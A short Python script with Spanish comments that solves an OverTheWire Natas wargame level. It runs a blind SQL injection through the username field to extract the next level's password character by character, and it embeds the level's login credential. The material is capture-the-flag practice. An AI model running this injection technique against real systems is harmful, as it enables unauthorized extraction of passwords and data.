import requests
import string

# Configuración básica
url = "http://natas15.natas.labs.overthewire.org/"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

# Caracteres a probar: abc...z, ABC...Z, 012...9
charset = string.ascii_letters + string.digits
password = ""

print("Iniciando búsqueda de contraseña para natas16...")

# Las contraseñas de Natas suelen tener 32 caracteres
for i in range(32):
    for char in charset:
    
        payload = f'natas16" AND password LIKE BINARY "{password}{char}%" #'
        
        data = {"username": payload}
        
        try:
            response = requests.post(url, auth=auth, data=data)
            
            
            if "This user exists" in response.text:
                password += char
                print(f"[+] Carácter encontrado: {password}")
                break 
        
        except Exception as e:
            print(f"Error en la petición: {e}")

print(f"\n--- CONTRASEÑA FINAL: {password} ---")